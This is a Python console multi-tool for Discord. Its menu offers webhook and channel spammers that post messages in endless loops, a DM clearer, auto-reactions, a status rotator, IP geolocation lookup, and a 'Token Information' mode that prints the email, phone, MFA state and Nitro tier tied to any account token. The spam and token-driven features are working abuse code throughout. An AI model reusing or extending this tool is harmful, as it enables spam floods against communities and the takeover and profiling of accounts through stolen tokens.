import os, requests, time, re, json, ipaddress
from os import system
GREEN = '\033[92m'
PURPLE = '\033[95m'
RED = '\033[91m'
GRAY = '\033[90m'
ENDC = '\033[0m'
def prompt_for_valid_input(prompt, validation_function, error_message):
    while True:
        user_input = input(prompt)
        if validation_function(user_input):
            return user_input
        else:
            print(RED + error_message + ENDC)
def send_discord_webhook(url, content):
    data = {'content': content}
    response = requests.post(url, json=data)
    if response.status_code == 204:
        print(GREEN + "[#] Message sent successfully!" + ENDC, ": " + PURPLE + content + ENDC)
    else:
        print(RED + f"[!] Failed to send message. Error code: {response.status_code}" + ENDC)
        print("[#] Retrying in 5 seconds...")
        time.sleep(5)
def delete_webhook(url):
    response = requests.delete(url)
    if response.status_code == 204:
        print(GREEN + "[#] Webhook deleted successfully!" + ENDC)
        input(PURPLE + "[#] Press enter to return." + ENDC)
        return True
    else:
        print(RED + f"[!] Failed to delete webhook. Error code: {response.status_code}" + ENDC)
        input(PURPLE + "[#] Press enter to return." + ENDC)
        return False
def validate_webhook_url(url):
    try:
        response = requests.get(url)
        response.raise_for_status()
        return True
    except (requests.RequestException, ValueError):
        return False
def get_user_info(token):
    headers = {'Authorization': token}
    try:
        response = requests.get('https://discord.com/api/v10/users/@me', headers=headers)
        response.raise_for_status()
        user_data = response.json()
        return user_data
    except requests.exceptions.RequestException:
        print(RED + f"[!] Failed to fetch token information." + ENDC)
        return None
def get_num_user_friends(token):
    headers = {'Authorization': token}
    try:
        response = requests.get('https://discord.com/api/v10/users/@me/relationships', headers=headers)
        response.raise_for_status()
        friends_data = response.json()
        num_friends = len([friend for friend in friends_data if friend['type'] == 1])
        return num_friends
    except requests.exceptions.RequestException:
        return 0
def get_num_user_guilds(token):
    headers = {'Authorization': token}
    try:
        response = requests.get('https://discord.com/api/v10/users/@me/guilds', headers=headers)
        response.raise_for_status()
        guilds_data = response.json()
        num_guilds = len(guilds_data)
        return num_guilds
    except requests.exceptions.RequestException:
        return 0
def validate_token(token):
    headers = {'Authorization': token}
    try:
        response = requests.get('https://discord.com/api/v10/users/@me', headers=headers)
        return response.status_code == 200
    except requests.exceptions.RequestException:
        return False
def close_all_dms(token):
    headers = {'Authorization': token}
    try:
        response = requests.get('https://discord.com/api/v10/users/@me/channels', headers=headers)
        response.raise_for_status()
        dm_channels = response.json()
        for channel in dm_channels:
            if channel['type'] != 1:
                continue
            channel_id = channel['id']
            response = requests.delete(f'https://discord.com/api/v10/channels/{channel_id}', headers=headers)
            if response.status_code == 200:
                print(GREEN + f"[#] Closed DM {channel_id}" + ENDC)
            else:
                print(RED + f"[!] Failed to close DM {channel_id}. Status code: {response.status_code}" + ENDC)
        if not any(channel['type'] == 1 for channel in dm_channels):
            print(RED + "[!] No DMs found to close." + ENDC)
        else:
            print(PURPLE + "[#] All DMs closed successfully." + ENDC)
    except requests.exceptions.RequestException:
        print(RED + f"[!] An error occurred. If this issue persists, please report it to schuh." + ENDC)
def react_to_message(message_id, emoji):
    reaction_url = f"https://discord.com/api/v9/channels/{channel_id}/messages/{message_id}/reactions/{emoji}/@me"
    headers = {'authorization': user_token, 'user-agent': 'Mozilla/5.0',}
    response = requests.put(reaction_url, headers=headers)
    return response.status_code, response.content.decode('utf-8')
def ip_lookup(ip):
    try:
        response = requests.get(f'https://ipinfo.io/{ip}/json')
        response.raise_for_status()
        data = response.json()
        return data
    except requests.exceptions.RequestException:
        return None
    except ValueError:
        return None
def validate_ip(ip):
    try:
        ipaddress.ip_address(ip)
        return True
    except Exception:
        return False
system("title " + f"Schuh Rewrite    -    CTRL + C at any time to stop")
while True:
    try:
        os.system('cls' if os.name == 'nt' else 'clear')
        mode = input(PURPLE + "[1] Webhook Spammer\n[2] Webhook Animator\n[3] Webhook Information\n[4] Webhook Deleter\n[5] Channel Spammer\n[6] Channel Monitoring\n[7] DM Channel Clearer\n[8] Message Reacter\n[9] Animated Status\n[10] Hypesquad Changer\n[11] IP Address Lookup\n[12] Token Information\n\n> " + ENDC)
        try:
            if int(mode) < 0 or int(mode) > 12:
                continue
        except ValueError:
            pass
        if mode == '1': 
            os.system('cls' if os.name == 'nt' else 'clear')
            message_content = prompt_for_valid_input(PURPLE + "[#] Message you want to spam: " + ENDC, lambda content: len(content) >= 1, RED + "[#] Message too short. Please enter a message with at least 1 character." + ENDC)            
            webhook_url = prompt_for_valid_input(PURPLE + "[#] Webhook URL: " + ENDC, validate_webhook_url, "[#] Invalid webhook URL. Please check the URL and try again.")
            delay = prompt_for_valid_input(PURPLE + "[#] Delay (in seconds): " + ENDC, lambda value: (value.replace('.', '', 1).isdigit() if '.' in value else value.isdigit()) and float(value) > 0, "[#] Invalid delay. Please enter a positive number.")
            delay = float(delay)
            while True:
                send_discord_webhook(webhook_url, message_content)
                time.sleep(delay)
        elif mode == '2':
            os.system('cls' if os.name == 'nt' else 'clear')
            message_content = prompt_for_valid_input(PURPLE + "[#] Message you want to spam and animate: " + ENDC, lambda content: len(content) >= 2, RED + "[#] Message too short. Please enter a message with at least 2 characters." + ENDC)            
            webhook_url = prompt_for_valid_input(PURPLE + "[#] Webhook URL: " + ENDC, validate_webhook_url, "[#] Invalid webhook URL. Please check the URL and try again.")
            delay = prompt_for_valid_input(PURPLE + "[#] Delay (in seconds): " + ENDC, lambda value: (value.replace('.', '', 1).isdigit() if '.' in value else value.isdigit()) and float(value) > 0, "[#] Invalid delay. Please enter a positive number.")
            delay = float(delay)
            while True:
                for i in range(1, len(message_content) + 1):
                    if message_content[i-1] != ' ':
                        animated_message = message_content[:i]
                        send_discord_webhook(webhook_url, animated_message)
                        time.sleep(delay)
                for i in range(len(message_content) - 1, 0, -1):
                    if message_content[i-1] != ' ':
                        animated_message = message_content[:i]
                        send_discord_webhook(webhook_url, animated_message)
                        time.sleep(delay)
        elif mode == '3':
            os.system('cls' if os.name == 'nt' else 'clear')
            webhook_url = prompt_for_valid_input(PURPLE + "[#] Webhook URL: " + ENDC, validate_webhook_url, "[#] Invalid webhook URL. Please check the URL and try again.")
            try:
                response = requests.get(webhook_url)
                if response.status_code == 200:
                    webhook_info = response.json()
                    print(GRAY + f"[#] Name: {webhook_info.get('name', 'N/A')}" + ENDC)
                    print(GRAY + f"[#] Guild ID: {webhook_info.get('guild_id', 'N/A')}" + ENDC)
                    print(GRAY + f"[#] Channel ID: {webhook_info.get('channel_id', 'N/A')}" + ENDC)
                    if 'avatar' in webhook_info and webhook_info['avatar'] is not None:
                        avatar_url = f"https://cdn.discordapp.com/avatars/{webhook_info['id']}/{webhook_info['avatar']}.png"
                        print(GRAY + f"[#] Avatar: {avatar_url}" + ENDC)
                    else:
                        print(GRAY + "[#] Avatar: N/A" + ENDC)
                    created_by = webhook_info.get('user')
                    if created_by:
                        created_by_username = created_by.get('username', 'N/A')
                        created_by_id = created_by.get('id', 'N/A')
                        print(GRAY + f"[#] Created by: {created_by_username} | ID: {created_by_id}" + ENDC)
                    else:
                        print(GRAY + f"[#] Created by: N/A" + ENDC)
                else:
                    print(RED + f"[!] Failed to fetch webhook information. Error code: {response.status_code}" + ENDC)
                input(PURPLE + "[#] Press enter to return." + ENDC)
            except json.JSONDecodeError:
                pass
        elif mode == '4':
            os.system('cls' if os.name == 'nt' else 'clear')
            webhook_url = prompt_for_valid_input(PURPLE + "[#] Webhook URL: " + ENDC, validate_webhook_url, "[#] Invalid webhook URL. Please check the URL and try again.")
            confirmation = input(PURPLE + "[#] Are you sure you want to delete the webhook? (y/n): " + ENDC)
            if confirmation.lower() == 'y':
                delete_webhook(webhook_url)
            else:
                print(RED + "[#] Webhook deletion cancelled." + ENDC)
                input(PURPLE + "[#] Press enter to return." + ENDC)
        elif mode == '5':
            os.system('cls' if os.name == 'nt' else 'clear')
            message_content = input(PURPLE + "[#] Message you want to spam: " + ENDC)
            user_token = prompt_for_valid_input(PURPLE + "[#] Token: " + ENDC, validate_token, "[#] Invalid Token. Please check the token and try again.")
            channel_link = prompt_for_valid_input(PURPLE + "[#] Channel Link: " + ENDC, lambda link: re.search(r'/channels/(\d+)/', link), "[#] Invalid Channel Link. Please check the link and try again.")            
            channel_id_match = re.search(r'/channels/(\d+)/', channel_link)
            channel_id = channel_id_match.group(1) if channel_id_match else None
            num_messages = prompt_for_valid_input(PURPLE + "[#] Number of times to send the message: " + ENDC, lambda value: value.isdigit() and int(value) > 0, "[#] Invalid input. Please enter a positive integer.")
            num_messages = int(num_messages)
            delay = prompt_for_valid_input(PURPLE + "[#] Delay (in seconds): " + ENDC, lambda value: (value.replace('.', '', 1).isdigit() if '.' in value else value.isdigit()) and float(value) > 0, "[#] Invalid delay. Please enter a positive number.")
            delay = float(delay)
            payload = {'content': message_content}
            header = {'authorization': user_token}
            for i in range(num_messages):
                response = requests.post(f"https://discord.com/api/v9/channels/{channel_id}/messages", data=payload, headers=header)
                if response.status_code == 200:
                    print(GREEN + f"[#] Message {i+1}/{num_messages} sent successfully!" + ENDC, ": " + PURPLE + message_content + ENDC)
                else:
                    print(RED + f"[!] Failed to send message. Error code: {response.status_code}" + ENDC)
                    print("[#] Retrying in 5 seconds...")
                    time.sleep(5)
                time.sleep(delay)
            input(PURPLE + "[#] Done sending. Press enter to return.")
            continue
        elif mode == '6':
            os.system('cls' if os.name == 'nt' else 'clear')
            user_token = prompt_for_valid_input(PURPLE + "[#] Token: " + ENDC, validate_token, "[#] Invalid Token. Please check the token and try again.")
            channel_link = prompt_for_valid_input(PURPLE + "[#] Channel Link: " + ENDC, lambda link: re.search(r'/channels/(\d+)/', link), "[#] Invalid Channel Link. Please check the link and try again.")
            channel_id_match = re.search(r'/channels/(\d+)/', channel_link)
            channel_id = channel_id_match.group(1) if channel_id_match else None
            headers = {'authorization': user_token, 'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36'}
            params = {'limit': 1}
            print(GREEN + "[#] Monitoring Channel. Press Ctrl + C to stop." + ENDC)
            processed_messages = set()
            try:
                while True:
                    response = requests.get(f"https://discord.com/api/v9/channels/{channel_id}/messages", params=params, headers=headers)
                    if response.status_code != 200:
                        print(RED + f"[!] Failed to retrieve messages. Status code: {response.status_code}" + ENDC)
                    else:
                        messages = response.json()
                        for message in reversed(messages):
                            if 'content' in message and 'id' in message:
                                message_id = message['id']
                                if message_id not in processed_messages:
                                    author = message['author']['username']
                                    content = message['content']
                                    if 'bot' in message['author'] and message['author']['bot']:
                                        author = author + " [BOT]"
                                    if 'attachments' in message:
                                        for attachment in message['attachments']:
                                            filename = attachment['filename']
                                            if filename.endswith(('.jpg', '.jpeg', '.png')):
                                                if content: content += " "
                                                content = GRAY + content + ENDC + RED + "[Image]" + ENDC
                                            elif filename.endswith(('.gif')):
                                                if content: content += " "
                                                content = GRAY + content + ENDC + RED + "[GIF]" + ENDC                                                
                                            elif filename.endswith(('.mp4', '.webm', '.mov')):
                                                if content: content += " "
                                                content = GRAY + content + ENDC + RED + "[Video]" + ENDC
                                            elif filename.endswith(('.mp3', '.wav', '.ogg')):
                                                if content: content += " "
                                                content = GRAY + content + ENDC + RED + "[Audio]" + ENDC
                                    if 'sticker_items' in message:
                                        content = RED + f"[Sticker]" + ENDC
                                    print(GRAY + f"[#] {author}: {content}" + ENDC)
                                    processed_messages.add(message_id)
            except KeyboardInterrupt:
                pass
        elif mode == '7':
            os.system('cls' if os.name == 'nt' else 'clear')
            user_token = prompt_for_valid_input(PURPLE + "[#] Token: " + ENDC, validate_token, "[#] Invalid Token. Please check the token and try again.")
            confirmation = input(RED + "[#] Are you sure you want to close all DMs for the provided token?\n[#] This will not leave group chats.\n[#] (y/n): " + ENDC)
            if confirmation.lower() == "y":
                close_all_dms(user_token)
            else:
                print(RED + "[#] DM closure canceled. No DMs were closed." + ENDC)
            input(PURPLE + "[#] Press enter to return." + ENDC)
            continue
        elif mode == '8':
            os.system('cls' if os.name == 'nt' else 'clear')
            user_token = prompt_for_valid_input(PURPLE + "[#] Token: " + ENDC, validate_token, "[#] Invalid Token. Please check the token and try again.")
            channel_link = prompt_for_valid_input(PURPLE + "[#] Channel Link: " + ENDC, lambda link: re.search(r'/channels/(\d+)/', link), "[#] Invalid Channel Link. Please check the link and try again.")
            channel_id_match = re.search(r'/channels/(\d+)/', channel_link)
            channel_id = channel_id_match.group(1) if channel_id_match else None
            emoji = prompt_for_valid_input(PURPLE + "[#] Emoji string (without angle brackets): " + ENDC, lambda e: len(e) > 0, "[#] Emoji string cannot be empty.")
            last_message_id = None
            while True:
                response = requests.get(f"https://discord.com/api/v9/channels/{channel_id}/messages?limit=1", headers={'authorization': user_token})
                if response.status_code != 200:
                    print(RED + f"[!] Failed to retrieve messages. Status code: {response.status_code}" + ENDC)
                    input(PURPLE + "[#] Press enter to return.")
                    continue
                messages = response.json()
                for message in messages:
                    if 'content' in message:
                        message_id = message['id']
                        if last_message_id is None or message_id > last_message_id:
                            status_code, response_content = react_to_message(message_id, emoji)
                            if status_code == 204:
                                print(GREEN + f"[#] Reacted to message" + ENDC, ": " + PURPLE + message_id + ENDC)
                            else:
                                print(RED + f"[!] Failed to react to message {message_id}. Status code: {status_code}" + ENDC)
                            last_message_id = message_id
        elif mode == '9':
            os.system('cls' if os.name == 'nt' else 'clear')
            user_token = prompt_for_valid_input(PURPLE + "[#] Token: " + ENDC, validate_token, "[#] Invalid Token. Please check the token and try again.")
            status_list_input = prompt_for_valid_input(PURPLE + "[#] List of Statuses (separated by commas): " + ENDC, lambda value: len(value.split(',')) >= 2, "[#] Invalid Statuses. Please enter at least 2 Statuses separated by commas.")
            status_list = [status.strip() for status in status_list_input.split(',') if status.strip()]
            delay = prompt_for_valid_input(PURPLE + "[#] Delay (in seconds): " + ENDC, lambda value: (value.replace('.', '', 1).isdigit() if '.' in value else value.isdigit()) and float(value) > 0, "[#] Invalid delay. Please enter a positive number.")
            delay = float(delay)
            index = 0
            headers = {'authorization': user_token, 'user-agent': 'Mozilla/5.0', 'content-type': 'application/json'}
            while True:
                status = status_list[index]
                payload = {'custom_status': {'text': status}}
                payload_json = json.dumps(payload)
                response = requests.patch('https://discord.com/api/v9/users/@me/settings', data=payload_json, headers=headers)
                if response.status_code == 200:
                    print(GREEN + "[#] Changed Status to: " + PURPLE + status + ENDC)
                else:
                    print(RED + f"[!] Failed to change Status. Status code: {response.status_code}" + ENDC)
                index = (index + 1) % len(status_list)
                time.sleep(delay)
        elif mode == '10':
            os.system('cls' if os.name == 'nt' else 'clear')
            user_token = prompt_for_valid_input(PURPLE + "[#] Token: " + ENDC, validate_token, "[#] Invalid Token. Please check the token and try again.")
            hypesquad_options = {'1': 'Bravery', '2': 'Brilliance', '3': 'Balance', '4': 'Remove'}
            for option, house in hypesquad_options.items():
                print(PURPLE + f"[#] {option}. {house}" + ENDC)
            print() 
            selected_option = prompt_for_valid_input(PURPLE + "> " + ENDC, lambda value: value in hypesquad_options, RED + "[#] Invalid Option. Please choose a valid Option." + ENDC)
            if selected_option == '4':
                headers = {'authorization': user_token, 'content-type': 'application/json'}
                response = requests.delete('https://discord.com/api/v9/hypesquad/online', headers=headers)
                if response.status_code == 204:
                    print(GREEN + "[#] Successfully removed HypeSquad House." + ENDC)
                else:
                    print(RED + f"[!] Failed to remove HypeSquad House. Status code: {response.status_code}" + ENDC)
            else:
                hypesquad_house = hypesquad_options[selected_option]
                headers = {'authorization': user_token, 'content-type': 'application/json'}
                payload = {'house_id': selected_option}
                response = requests.post('https://discord.com/api/v9/hypesquad/online', json=payload, headers=headers)
                if response.status_code == 204:
                    print(GREEN + f"[#] Successfully changed HypeSquad House to {hypesquad_house}." + ENDC)
                else:
                    print(RED + f"[!] Failed to change HypeSquad House. Status code: {response.status_code}" + ENDC)
            input(PURPLE + "[#] Press enter to return." + ENDC)
        elif mode == '11':
            os.system('cls' if os.name == 'nt' else 'clear')
            ip_address = prompt_for_valid_input(PURPLE + "[#] IP Address: " + ENDC, validate_ip, "[#] Invalid IP Address. Please check the IP and try again.")
            ip_data = ip_lookup(ip_address)
            if ip_data is not None:
                print(GRAY + f"[#] City: {ip_data.get("city", "N/A")}" + ENDC)
                print(GRAY + f"[#] Region: {ip_data.get("region", "N/A")}" + ENDC)
                print(GRAY + f"[#] Country: {ip_data.get("country", "N/A")}" + ENDC)
                print(GRAY + f"[#] Postal: {ip_data.get("postal", "N/A")}" + ENDC)
                print(GRAY + f"[#] Timezone: {ip_data.get("timezone", "N/A")}" + ENDC)
                print(GRAY + f"[#] Hostname: {ip_data.get("hostname", "N/A")}" + ENDC)
                print(GRAY + f"[#] Organization: {ip_data.get("org", "N/A")}" + ENDC)
                print(GRAY + f"[#] Location: {ip_data.get("loc", "N/A")}" + ENDC)
            else:
                print(RED + "[!] An unknown error occurred." + ENDC)
            input(PURPLE + "[#] Press enter to return." + ENDC)
            continue
        elif mode == '12':
            os.system('cls' if os.name == 'nt' else 'clear')
            user_token = prompt_for_valid_input(PURPLE + "[#] Token: " + ENDC, validate_token, "[#] Invalid Token. Please check the token and try again.")
            num_guilds = get_num_user_guilds(user_token)
            num_friends = get_num_user_friends(user_token)
            user_info = get_user_info(user_token)
            if user_info:
                print(GRAY + f"[#] Username: {user_info['username']}" + ENDC)
                print(GRAY + f"[#] ID: {user_info['id']}" + ENDC)
                print(GRAY + f"[#] Email: {user_info['email']}" + ENDC)
                if 'verified' in user_info:
                    verified = user_info['verified']
                    if verified:
                        print(GRAY + f"[#] Email Verified: Yes" + ENDC)
                    else:
                        print(GRAY + f"[#] Email Verified: No" + ENDC)
                print(GRAY + f"[#] Phone: {user_info.get('phone', 'N/A')}" + ENDC)
                if 'mfa_enabled' in user_info:
                    mfa_enabled = user_info['mfa_enabled']
                    if mfa_enabled:
                        print(GRAY + f"[#] MFA Enabled: Yes" + ENDC)
                    else:
                        print(GRAY + f"[#] MFA Enabled: No" + ENDC)
                if 'premium_type' in user_info:
                    nitro_type = user_info['premium_type']
                    if nitro_type == 3:
                        print(GRAY + f"[#] Nitro: Yes" + ENDC)
                        print(GRAY + f"[#] Nitro Type: $3 Nitro" + ENDC)
                    elif nitro_type == 2:
                        print(GRAY + f"[#] Nitro: Yes" + ENDC)
                        print(GRAY + f"[#] Nitro Type: $10 Nitro" + ENDC)
                    elif nitro_type == 1:
                        print(GRAY + f"[#] Nitro: Yes" + ENDC)
                        print(GRAY + f"[#] Nitro Type: $5 Nitro" + ENDC)
                    else:
                        print(GRAY + f"[#] Nitro: No" + ENDC)
                print(GRAY + f"[#] Friends: {num_friends}" + ENDC)
                print(GRAY + f"[#] Servers: {num_guilds}" + ENDC)
            input(PURPLE + "[#] Press enter to return.")
            continue
    except KeyboardInterrupt:
        continue
    except EOFError:
        pass
